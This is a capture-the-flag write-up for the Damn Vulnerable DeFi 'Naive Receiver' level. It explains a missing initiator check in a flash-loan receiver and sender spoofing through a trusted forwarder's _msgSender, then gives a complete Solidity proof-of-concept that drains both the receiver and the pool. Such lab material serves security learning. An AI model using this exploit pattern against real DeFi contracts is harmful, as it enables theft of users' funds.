# Naive Receiver

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.



# Solution


# Challenge Overview

## official website(https://www.damnvulnerabledefi.xyz/challenges/naive-receiver)

I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Naive Receiver challenge is the second level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the user and FlashLoanReceiver.

We have 4 files(Contracts) to watch out :

- BasicForwarder.sol
- FlashLoanReceiver.sol
- Multicall.sol
- NaiveReceiverPool.sol

onFlashLoan function inside the FlashLoanReceiver.sol. You can just have a look:

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```

In this code the first parameter which is supposed to be the initiator’s address(The person who initiated the flash loan) is not used anywhere. That means the protocol is suffering form access control vulnerability. Using this we can drain the receiver. Okay our first job: draining user’s eth is kinda done(wait! we just found the method not exploited yet)

The Next target: NaiveReceiverPool contract includes _msgSender() which could be abused and make exploit happen in withdraw() function.

Okay let’s have a look at the _msgSender() function :

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```


First of let’s understand the logic :

1. It checks if msg.sender is relayer(who forwards the calldata to onchain came from user) and checks msg.data’s length is more than or equal to 20 bytes. If yes it returns the last 20 bytes of msg.data if any of these doesn’t match it will return the normal msg.sender (the address that directly called the contract).

In this function we can craft a transaction that comes from the trusted forwarder and we can control msg.data. We can make sure that the last 20 bytes are any address of account that we wish to control. That way we can impersonate accounts and perform the withdraw function on their behalf.

I think the concept is clear now. So, let’s begin to the attacking phase…..

First of all we need to set 11 transactions coz we need to drain 10 weth from user while transacting from his amount as fees and the fees is fixed to 1 weth per transactions(user’s money draining success!) and last one to drain the weth from the pool by spoofing _msgSender.

here is the POC :

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
        // - Prepare call data for 10 flashloans(drain the user) and 1 withdrawals(drain the protocol) 
        bytes[] memory callDatas = new bytes[](11);

        // - Encode the call on behalf of NaiveReceiver 
        for (uint i = 0; i < 10; i++){
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x")
            );
        }

        // - Encode the withdrawal call, Exploit the access control vuln by passing the req through the forwarderand setting 
        //   then deployer as sender in the last 20 bytes 
        callDatas[10] = abi.encodePacked(abi.encodeCall(
            NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ), bytes32(uint256(uint160(deployer))));

        // - Encode the Multicall 
        bytes memory multicallData = abi.encodeCall(pool.multicall , callDatas);

        // - Create Forwarder request 
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            multicallData,
            1 days
        );

        // - Hash the request 
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // - Sign the req 
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(v,r,s);

        // - Execute the req 
        forwarder.execute(request, signature);
    }
```